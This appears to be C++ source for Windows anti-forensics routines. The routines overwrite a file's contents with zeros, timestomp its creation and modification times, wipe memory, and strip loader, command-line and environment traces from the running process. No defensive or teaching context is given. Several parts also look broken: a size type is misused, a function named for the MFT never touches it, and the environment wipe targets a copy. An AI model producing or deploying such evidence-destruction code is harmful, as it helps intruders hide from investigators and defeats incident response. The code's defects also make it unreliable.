#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>
#include "timestomp.h"

#pragma comment(lib, "ntdll.lib")

BOOL CorruptMftEntry(LPCWSTR filePath) {
    HANDLE hFile = CreateFileW(
        filePath,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_FLAG_BACKUP_SEMANTICS,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE)
        return FALSE;

    FILE_STANDARD_INFO fileInfo;
    GetFileInformationByHandleEx(hFile, FileStandardInfo, &fileInfo, sizeof(fileInfo));

    BYTE* zeroBuffer = new BYTE[fileInfo.EndOfFile];
    SecureZeroMemory(zeroBuffer, fileInfo.EndOfFile);

    DWORD bytesWritten;
    WriteFile(hFile, zeroBuffer, fileInfo.EndOfFile, &bytesWritten, NULL);
    FlushFileBuffers(hFile);

    DWORD bytesReturned;
    DeviceIoControl(
        hFile,
        FSCTL_SET_SPARSE,
        NULL, 0,
        NULL, 0,
        &bytesReturned,
        NULL
    );

    CloseHandle(hFile);
    return TRUE;
}

VOID TimeStompFile(LPCWSTR filePath) {
    HANDLE hFile = CreateFileW(
        filePath,
        FILE_WRITE_ATTRIBUTES,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile != INVALID_HANDLE_VALUE) {
        FILETIME ft;
        SYSTEMTIME st;
        GetSystemTime(&st);
        SystemTimeToFileTime(&st, &ft);

        SetFileTime(hFile, &ft, &ft, &ft);
        CloseHandle(hFile);
    }
}

VOID WipeMemory(PVOID addr, SIZE_T len) {
    volatile char* p = (volatile char*)addr;
    while (len--) *p++ = 0;

    MemoryBarrier();
}

VOID CleanProcessArtifacts() {
    // clear ped loader traces
    PPEB pPeb = (PPEB)__readgsqword(0x60);
    pPeb->Ldr = NULL;
    pPeb->ProcessParameters->CommandLine.Buffer = NULL;

    // !env vars
    LPWCH envStrings = GetEnvironmentStrings();
    while (*envStrings) {
        size_t len = wcslen(envStrings) + 1;
        SecureZeroMemory(envStrings, len * sizeof(WCHAR));
        envStrings += len;
    }
}
